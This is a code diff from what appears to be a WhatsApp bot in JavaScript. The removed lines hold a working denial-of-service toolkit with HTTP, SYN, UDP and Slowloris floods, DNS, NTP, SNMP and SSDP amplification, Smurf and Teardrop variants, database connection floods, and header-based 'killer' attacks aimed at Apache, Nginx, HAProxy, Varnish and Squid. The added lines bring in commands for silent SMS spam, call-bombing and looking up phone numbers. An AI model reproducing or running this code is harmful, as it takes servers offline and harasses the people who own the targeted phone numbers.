-                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Connection': 'keep-alive',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
-                    'Upgrade-Insecure-Requests': '1',
-                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
-                };
-
-                promises.push(
-                    axios.get(url, { 
-                        headers, 
-                        timeout: 1000,
-                        httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
-                    }).catch(() => {})
-                );
-            }
-            await Promise.allSettled(promises);
-            requests += promises.length;
-        };
-
-        const attackLoop = setInterval(flood, 50);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `HTTP Flood - ${requests} requests sent`
-        };
+class SpamCommand {
+    constructor(phoneAttacks) {
+        this.phoneAttacks = phoneAttacks;
+        this.name = 'spam';
+        this.description = 'Silent spam phone number';
     }
 
-    async synFlood(target, duration, attackId) {
-        const ports = [80, 443, 8080, 8443, 21, 22, 23, 25, 53, 110, 143, 993, 995, 3306, 5432];
-        const ip = await this.resolveTarget(target);
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const sock = new net.Socket();
-            const port = ports[Math.floor(Math.random() * ports.length)];
-            
-            sock.connect(port, ip, () => {
-                const synPacket = Buffer.from([
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-                ]);
-                sock.write(synPacket);
-                packets++;
-                sock.destroy();
-            });
-            
-            sock.setTimeout(50, () => sock.destroy());
-            sock.on('error', () => {});
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `SYN Flood - ${packets} SYN packets sent`
-        };
-    }
-
-    async slowloris(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const connections = [];
-
-        const createConnection = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const sock = new net.Socket();
-            sock.connect(80, ip, () => {
-                sock.write('GET / HTTP/1.1\r\n');
-                sock.write(`Host: ${target}\r\n`);
-                sock.write('User-Agent: Mozilla/5.0\r\n');
-                sock.write('Accept: */*\r\n');
-                
-                const keepAlive = setInterval(() => {
-                    try {
-                        if (!this.activeAttacks.has(target)) {
-                            clearInterval(keepAlive);
-                            sock.destroy();
-                            return;
-                        }
-                        sock.write('X-a: ' + crypto.randomBytes(8).toString('hex') + '\r\n');
-                    } catch (e) {
-                        clearInterval(keepAlive);
-                    }
-                }, 3000);
-
-                connections.push({ sock, keepAlive });
-            });
-
-            sock.setTimeout(5000, () => {
-                sock.destroy();
-            });
-            sock.on('error', () => {});
-        };
-
-        for (let i = 0; i < 3000; i++) {
-            if (!this.activeAttacks.has(target)) break;
-            createConnection();
-            await this.sleep(5);
-        }
-
-        await this.sleep(duration * 1000);
-
-        connections.forEach(({ sock, keepAlive }) => {
-            clearInterval(keepAlive);
-            sock.destroy();
-        });
-
-        return {
-            status: 'COMPLETED',
-            connections: connections.length,
-            details: `Slowloris - ${connections.length} connections held`
-        };
-    }
-
-    async udpFlood(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const port = Math.floor(Math.random() * 65535) + 1;
-            const size = Math.floor(Math.random() * 1400) + 64;
-            const data = crypto.randomBytes(size);
-            
-            sock.send(data, port, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `UDP Flood - ${packets} UDP packets sent`
-        };
-    }
-
-    async dnsAmplification(target, duration, attackId) {
-        const dnsServers = [
-            '8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222',
-            '8.26.56.26', '8.20.247.20', '156.154.70.1', '156.154.71.1',
-            '4.2.2.1', '4.2.2.2', '4.2.2.3', '4.2.2.4'
-        ];
-
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const dns = dnsServers[Math.floor(Math.random() * dnsServers.length)];
-            const query = this.buildDNSQuery(target);
-            
-            sock.send(query, 53, dns, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `DNS Amplification - ${packets} queries sent`
-        };
-    }
-
-    buildDNSQuery(target) {
-        const query = Buffer.alloc(512);
-        query.writeUInt16BE(0xAAAA, 0);
-        query.writeUInt16BE(0x0100, 2);
-        query.writeUInt16BE(0x0001, 4);
-        query.writeUInt16BE(0x0000, 6);
-        query.writeUInt16BE(0x0000, 8);
-        query.writeUInt16BE(0x0000, 10);
-        
-        const parts = target.split('.');
-        let offset = 12;
-        for (const part of parts) {
-            query.writeUInt8(part.length, offset);
-            offset++;
-            for (let i = 0; i < part.length; i++) {
-                query.writeUInt8(part.charCodeAt(i), offset);
-                offset++;
-            }
-        }
-        query.writeUInt8(0x00, offset);
-        offset++;
-        
-        query.writeUInt16BE(0x00FF, offset);
-        offset += 2;
-        query.writeUInt16BE(0x0001, offset);
-        
-        return query.subarray(0, offset + 2);
-    }
-
-    async tlsReaper(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let connections = 0;
-
-        const createTLS = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const options = {
-                host: ip,
-                port: 443,
-                rejectUnauthorized: false,
-                secureProtocol: 'TLSv1_2_method',
-                ciphers: 'ALL:!aNULL:!eNULL:!LOW:!EXPORT:!SSLv2'
-            };
-
-            const socket = tls.connect(options, () => {
-                connections++;
-                const malformed = Buffer.from([
-                    0x16, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-                ]);
-                socket.write(malformed);
-            });
-
-            socket.setTimeout(1000, () => socket.destroy());
-            socket.on('error', () => {});
-        };
-
-        const attackLoop = setInterval(createTLS, 10);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            connections: connections,
-            details: `TLS Reaper - ${connections} TLS connections established`
-        };
-    }
-
-    async http2Flood(target, duration, attackId) {
-        const http2 = require('http2');
-        const client = http2.connect(`https://${target}`);
-        let requests = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const req = client.request({
-                ':path': '/',
-                ':method': 'GET',
-                'user-agent': 'Mozilla/5.0'
-            });
-            req.on('response', () => {});
-            req.on('end', () => {});
-            req.end();
-            requests++;
-        };
-
-        const attackLoop = setInterval(flood, 10);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-        client.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `HTTP/2 Flood - ${requests} requests sent`
-        };
-    }
-
-    async websocketFlood(target, duration, attackId) {
-        const WebSocket = require('ws');
-        let connections = 0;
-
-        const createWS = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const ws = new WebSocket(`ws://${target}/ws`);
-                ws.on('open', () => {
-                    connections++;
-                    // Send random payloads
-                    setInterval(() => {
-                        if (!this.activeAttacks.has(target)) {
-                            ws.close();
-                            return;
-                        }
-                        ws.send(crypto.randomBytes(1024).toString('hex'));
-                    }, 100);
-                });
-                ws.on('error', () => {});
-            } catch(e) {}
-        };
-
-        for (let i = 0; i < 500; i++) {
-            if (!this.activeAttacks.has(target)) break;
-            createWS();
-            await this.sleep(10);
-        }
-
-        await this.sleep(duration * 1000);
-
-        return {
-            status: 'COMPLETED',
-            connections: connections,
-            details: `WebSocket Flood - ${connections} connections established`
-        };
-    }
-
-    async mysqlCrash(target, duration, attackId) {
-        const mysql = require('mysql2/promise');
-        let attempts = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const conn = await mysql.createConnection({
-                    host: target,
-                    user: 'admin',
-                    password: crypto.randomBytes(16).toString('hex'),
-                    database: 'mysql',
-                    connectTimeout: 1000
-                });
-                await conn.query('SELECT 1');
-                await conn.end();
-                attempts++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 10);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            connections: attempts,
-            details: `MySQL Crash - ${attempts} connection attempts`
-        };
-    }
-
-    async postgresCrash(target, duration, attackId) {
-        const { Client } = require('pg');
-        let attempts = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const client = new Client({
-                    host: target,
-                    user: 'postgres',
-                    password: crypto.randomBytes(16).toString('hex'),
-                    database: 'postgres',
-                    port: 5432,
-                    connectionTimeoutMillis: 1000
-                });
-                await client.connect();
-                await client.query('SELECT 1');
-                await client.end();
-                attempts++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 10);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            connections: attempts,
-            details: `PostgreSQL Crash - ${attempts} connection attempts`
-        };
-    }
-
-    async redisFlood(target, duration, attackId) {
-        const Redis = require('ioredis');
-        let connections = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const redis = new Redis({
-                    host: target,
-                    port: 6379,
-                    connectTimeout: 1000
-                });
-                redis.ping().catch(() => {});
-                redis.quit();
-                connections++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 5);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            connections: connections,
-            details: `Redis Flood - ${connections} connection attempts`
-        };
-    }
-
-    async memcachedCrash(target, duration, attackId) {
-        const memjs = require('memjs');
-        let requests = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const client = memjs.Client.create(`${target}:11211`);
-                client.set('key_' + crypto.randomBytes(4).toString('hex'), crypto.randomBytes(1024).toString('hex'), {});
-                requests++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 5);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `Memcached Crash - ${requests} requests sent`
-        };
-    }
-
-    async ntpAmplification(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const ntpQuery = Buffer.from([
-                0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-            ]);
-            
-            sock.send(ntpQuery, 123, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `NTP Amplification - ${packets} queries sent`
-        };
-    }
-
-    async snmpAmplification(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            // SNMP GetBulk query for amplification
-            const snmpQuery = Buffer.from([
-                0x30, 0x3c, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70,
-                0x75, 0x62, 0x6c, 0x69, 0x63, 0xa5, 0x2f, 0x02,
-                0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
-                0x30, 0x24, 0x30, 0x0f, 0x06, 0x09, 0x2b, 0x06,
-                0x01, 0x02, 0x01, 0x01, 0x02, 0x01, 0x00, 0x05,
-                0x00, 0x30, 0x11, 0x06, 0x0b, 0x2b, 0x06, 0x01,
-                0x02, 0x01, 0x01, 0x03, 0x01, 0x01, 0x00, 0x00,
-                0x05, 0x00
-            ]);
-            
-            sock.send(snmpQuery, 161, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `SNMP Amplification - ${packets} queries sent`
-        };
-    }
-
-    async ssdpAmplification(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const ssdpQuery = `M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n`;
-            
-            sock.send(ssdpQuery, 1900, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `SSDP Amplification - ${packets} queries sent`
-        };
-    }
-
-    async chargenFlood(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const data = crypto.randomBytes(1024);
-            sock.send(data, 19, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `Chargen Flood - ${packets} packets sent`
-        };
-    }
-
-    async smurfAttack(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-        const broadcastAddr = ip.replace(/\d+$/, '255');
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const icmpPacket = Buffer.from([
-                0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-            ]);
-            
-            sock.send(icmpPacket, 7, broadcastAddr, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `Smurf Attack - ${packets} ICMP packets sent`
-        };
-    }
-
-    async fraggleAttack(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-        const broadcastAddr = ip.replace(/\d+$/, '255');
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const data = crypto.randomBytes(1024);
-            sock.send(data, 7, broadcastAddr, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `Fraggle Attack - ${packets} UDP packets sent`
-        };
-    }
-
-    async landAttack(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const sock = new net.Socket();
-            sock.connect(80, ip, () => {
-                const packet = Buffer.from([
-                    0x45, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00,
-                    0x40, 0x06, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x01,
-                    0x7f, 0x00, 0x00, 0x01
-                ]);
-                sock.write(packet);
-                packets++;
-                sock.destroy();
-            });
-            sock.setTimeout(50, () => sock.destroy());
-            sock.on('error', () => {});
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `LAND Attack - ${packets} packets sent`
-        };
-    }
-
-    async teardropAttack(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const sock = new net.Socket();
-            sock.connect(80, ip, () => {
-                const packet = Buffer.from([
-                    0x45, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x00,
-                    0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-                ]);
-                sock.write(packet);
-                packets++;
-                sock.destroy();
-            });
-            sock.setTimeout(50, () => sock.destroy());
-            sock.on('error', () => {});
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `Teardrop Attack - ${packets} packets sent`
-        };
-    }
-
-    async pingOfDeath(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const data = crypto.randomBytes(65507);
-            sock.send(data, 1, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 10);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `Ping of Death - ${packets} oversized packets sent`
-        };
-    }
-
-    async slowReadAttack(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const connections = [];
-
-        const createConnection = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const sock = new net.Socket();
-            sock.connect(80, ip, () => {
-                sock.write('GET / HTTP/1.1\r\n');
-                sock.write(`Host: ${target}\r\n`);
-                sock.write('Connection: keep-alive\r\n\r\n');
-                
-                // Read slowly - 1 byte at a time
-                sock.on('data', (data) => {
-                    // Consume data slowly
-                });
-                
-                connections.push(sock);
-            });
-            sock.on('error', () => {});
-        };
-
-        for (let i = 0; i < 500; i++) {
-            if (!this.activeAttacks.has(target)) break;
-            createConnection();
-            await this.sleep(10);
-        }
-
-        await this.sleep(duration * 1000);
-
-        connections.forEach(sock => sock.destroy());
-
-        return {
-            status: 'COMPLETED',
-            connections: connections.length,
-            details: `Slow Read Attack - ${connections.length} slow connections`
-        };
-    }
-
-    async rUDeadAttack(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        const sock = dgram.createSocket('udp4');
-        let packets = 0;
-
-        const flood = () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const port = Math.floor(Math.random() * 65535) + 1;
-            const data = Buffer.from('R.U.D.E.D');
-            sock.send(data, port, ip, (err) => {
-                if (!err) packets++;
-            });
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        sock.close();
-
-        return {
-            status: 'COMPLETED',
-            packets: packets,
-            details: `R.U.Dead Attack - ${packets} packets sent`
-        };
-    }
-
-    async apacheKiller(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let requests = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const response = await axios.get(`http://${target}/?${crypto.randomBytes(1024).toString('hex')}=${crypto.randomBytes(1024).toString('hex')}`, {
-                    headers: {
-                        'Range': 'bytes=0-0',
-                        'If-Range': crypto.randomBytes(1024).toString('hex')
-                    },
-                    timeout: 1000
-                });
-                requests++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `Apache Killer - ${requests} requests sent`
-        };
-    }
-
-    async nginxKiller(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let requests = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const response = await axios.get(`http://${target}/`, {
-                    headers: {
-                        'Range': 'bytes=0-18446744073709551615',
-                        'If-Range': crypto.randomBytes(1024).toString('hex')
-                    },
-                    timeout: 1000
-                });
-                requests++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `Nginx Killer - ${requests} requests sent`
-        };
-    }
-
-    async haproxyKiller(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let requests = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const response = await axios.get(`http://${target}/`, {
-                    headers: {
-                        'Connection': 'close, TE',
-                        'TE': 'trailers, deflate, gzip',
-                        'Transfer-Encoding': 'chunked'
-                    },
-                    timeout: 1000
-                });
-                requests++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `HAProxy Killer - ${requests} requests sent`
-        };
-    }
-
-    async varnishKiller(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let requests = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const response = await axios.get(`http://${target}/`, {
-                    headers: {
-                        'X-Forwarded-For': crypto.randomBytes(1024).toString('hex'),
-                        'X-Varnish': crypto.randomBytes(1024).toString('hex')
-                    },
-                    timeout: 1000
-                });
-                requests++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `Varnish Killer - ${requests} requests sent`
-        };
-    }
-
-    async squidKiller(target, duration, attackId) {
-        const ip = await this.resolveTarget(target);
-        let requests = 0;
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            try {
-                const response = await axios.get(`http://${target}/`, {
-                    headers: {
-                        'Proxy-Connection': 'keep-alive',
-                        'Via': crypto.randomBytes(1024).toString('hex')
-                    },
-                    timeout: 1000
-                });
-                requests++;
-            } catch(e) {}
-        };
-
-        const attackLoop = setInterval(flood, 1);
-        await this.sleep(duration * 1000);
-        clearInterval(attackLoop);
-
-        return {
-            status: 'COMPLETED',
-            packets: requests,
-            details: `Squid Killer - ${requests} requests sent`
-        };
+    async execute(sock, msg, args, ctx) {
+        await this.phoneAttacks.spamExecute(sock, msg, args, ctx);
     }
 }
 
-class VCrashStopCommand {
-    constructor(vcrash) {
-        this.name = 'vcrash_stop';
-        this.description = 'Stop running V-Crash attacks';
-        this.vcrash = vcrash;
+class CallbombCommand {
+    constructor(phoneAttacks) {
+        this.phoneAttacks = phoneAttacks;
+        this.name = 'callbomb';
+        this.description = 'Silent call flood';
+    }
+
+    async execute(sock, msg, args, ctx) {
+        await this.phoneAttacks.callbombExecute(sock, msg, args, ctx);
+    }
+}
+
+class PhoneInfoCommand {
+    constructor(phoneAttacks) {
+        this.phoneAttacks = phoneAttacks;
+        this.name = 'phoneinfo';
+        this.description = 'Global phone info';
+    }
+
+    async execute(sock, msg, args, ctx) {
+        await this.phoneAttacks.phoneinfoExecute(sock, msg, args, ctx);
+    }
+}
+
+class SpamStopCommand {
+    constructor(phoneAttacks) {
+        this.phoneAttacks = phoneAttacks;
+        this.name = 'spam_stop';
+        this.description = 'Stop silent spam';
     }
 
     async execute(sock, msg, args, ctx) {
         if (args.length < 1) {
-            await sock.sendMessage(ctx.from, {
-                text: 'Usage: .vcrash_stop <target>'
-            }, { quoted: msg });
+            await sock.sendMessage(ctx.from, { text: 'Usage: .spam_stop <phone>' }, { quoted: msg });
             return;
         }
-
-        const target = args[0];
-        if (this.vcrash.activeAttacks.has(target)) {
-            this.vcrash.activeAttacks.delete(target);
-            await sock.sendMessage(ctx.from, {
-                text: `✅ Stopped attack on ${target}`
-            }, { quoted: msg });
+        const phone = args[0].replace(/[^0-9]/g, '');
+        if (this.phoneAttacks.activeSpams.has(phone)) {
+            this.phoneAttacks.activeSpams.delete(phone);
+            await sock.sendMessage(ctx.from, { text: `✅ Stopped silent spam on ${phone}` }, { quoted: msg });
         } else {
-            await sock.sendMessage(ctx.from, {
-                text: `❌ No active attack on ${target}`
-            }, { quoted: msg });
+            await sock.sendMessage(ctx.from, { text: `❌ No active spam on ${phone}` }, { quoted: msg });
         }
     }
 }
 
-module.exports = { VCrashCommand, VCrashStopCommand };
+class CallbombStopCommand {
+    constructor(phoneAttacks) {
+        this.phoneAttacks = phoneAttacks;
+        this.name = 'callbomb_stop';
+        this.description = 'Stop silent callbomb';
+    }
+
+    async execute(sock, msg, args, ctx) {
+        if (args.length < 1) {
+            await sock.sendMessage(ctx.from, { text: 'Usage: .callbomb_stop <phone>' }, { quoted: msg });
+            return;
+        }
+        const phone = args[0].replace(/[^0-9]/g, '');
+        if (this.phoneAttacks.activeCallBombs.has(phone)) {
+            this.phoneAttacks.activeCallBombs.delete(phone);
+            await sock.sendMessage(ctx.from, { text: `✅ Stopped silent callbomb on ${phone}` }, { quoted: msg });
+        } else {
+            await sock.sendMessage(ctx.from, { text: `❌ No active callbomb on ${phone}` }, { quoted: msg });
+        }
+    }
+}
+
+module.exports = {
+    PhoneAttacks,
+    SpamCommand,
+    CallbombCommand,
+    PhoneInfoCommand,
+    SpamStopCommand,
+    CallbombStopCommand
+};
